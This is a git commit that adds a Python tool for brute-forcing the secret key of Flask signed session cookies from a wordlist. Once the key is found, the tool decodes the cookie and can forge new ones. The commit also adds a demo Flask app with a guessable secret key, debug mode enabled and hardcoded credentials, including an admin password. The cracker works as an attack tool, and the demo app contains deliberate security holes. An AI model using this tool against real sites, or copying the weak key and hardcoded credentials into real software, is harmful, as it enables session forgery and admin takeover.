ca9b8f92d3b2950df7e9b666dfbc233f8d6d38cc
Matías Lang <shareman1204@gmail.com>
2013-07-30 16:39:54 -0300

    primer commit

---
+++ cracker.py
@@ -0,0 +1,86 @@
+#-*- coding: utf-8 -*-
+
+import sys
+import signal
+import time
+from threading import Thread
+from flask import sessions
+
+terminar = False
+cracked = dict() # Diccionario que contiene la clave secreta para cada cookie
+threads = 2
+
+class Config(object):
+    def __init__(self, key):
+        """ Le doy un atributo secret_key a la instancia de la 
+        clase """
+        self.secret_key = key
+
+def signal_handler(signal, frame):
+    global terminar
+    print 'Terminando'
+    terminar = True
+
+signal.signal(signal.SIGINT, signal_handler)
+signal.signal(signal.SIGTERM, signal_handler)
+
+def crack(cookie, wordlist):
+    """ Intenta crackear la cookie usando una lista con posibles
+    valores para clave. Cuando la encuentra la agrega a cracked """
+    interface = sessions.SecureCookieSessionInterface()
+    for word in wordlist:
+        if terminar:
+            break
+        config = Config(word)
+        serializer = interface.get_signing_serializer(config)
+        try:
+            serializer.loads(cookie)
+        except:
+            # Clave incorrecta
+            pass
+        else:
+            # Clave correcta
+            cracked[cookie] = word
+            break
+
+def thread_crack(cookie, wordlist, threads):
+    global terminar
+    """ Crackea la cookie en la cantidad de threads especificados.
+    Retorna la clave secreta de la cookie"""
+    for i in range(threads):
+        wl = wordlist[i::threads] # Wordlist para cada hilo
+        Thread(target = crack, args=(cookie, wl)).start()
+
+    while not terminar:
+        if cookie in cracked:
+            terminar = True
+            return cracked[cookie]
+
+def loads(secret_key, cookie):
+    """ Retorna el contenido de la cookie decodificado """
+    interface = sessions.SecureCookieSessionInterface()
+    config = Config(secret_key)
+    serializer = interface.get_signing_serializer(config)
+    return serializer.loads(cookie)
+
+def dumps(secret_key, obj):
+    """ Retorna una cookie de sesión válida con los datos indicados
+    en obj """
+    interface = sessions.SecureCookieSessionInterface()
+    config = Config(secret_key)
+    serializer = interface.get_signing_serializer(config)
+    return serializer.dumps(obj)
+
+def main():
+    inicio = time.time()
+    wordlist = open(sys.argv[1]).readlines()
+    wordlist = [w.strip() for w in wordlist]
+    cookie = raw_input('Cookie: ')
+    secret_key = thread_crack(cookie, wordlist, threads)
+    if secret_key:
+        print 'Crackedo. Clave:', secret_key
+        print 'Decodificado:', loads(secret_key, cookie)
+        print 'Terminado en', time.time() - inicio, 'segundos'
+
+if __name__ == '__main__':
+    main()
---
+++ demo_app/main.py
@@ -0,0 +1,47 @@
+#-*- coding: utf-8 -*-
+
+from flask import Flask, redirect, url_for, render_template, session, request
+app = Flask(__name__)
+app.debug = True
+app.secret_key='bigsecret'
+#app.config['SESSION_COOKIE_HTTPONLY'] = False # Para debugear
+
+users = [
+        ('guest', 'guest', False),
+        ('admin', 'topsecret', True),
+        ]
+
+@app.route('/')
+def index():
+    if not 'usuario' in session:
+        return redirect(url_for('login'))
+    return render_template('index.html')
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'GET':
+        return render_template('login.html')
+    else:
+        user = request.form.get('username')
+        pwd = request.form.get('pwd')
+        if (user, pwd, True) in users:
+            session['usuario'] = user
+            session['admin'] = True
+            return redirect(url_for('index'))
+        elif (user, pwd, False) in users:
+            session['usuario'] = user
+            session['admin'] = False
+            return redirect(url_for('index'))
+        else:
+            return render_template('login.html', e='Datos incorrectos')
+
+@app.route('/logout')
+def logout():
+    session.pop('usuario', None)
+    session.pop('admin', None)
+    return redirect(url_for('index'))
+
+if __name__ == '__main__':
+    app.run()
+
+
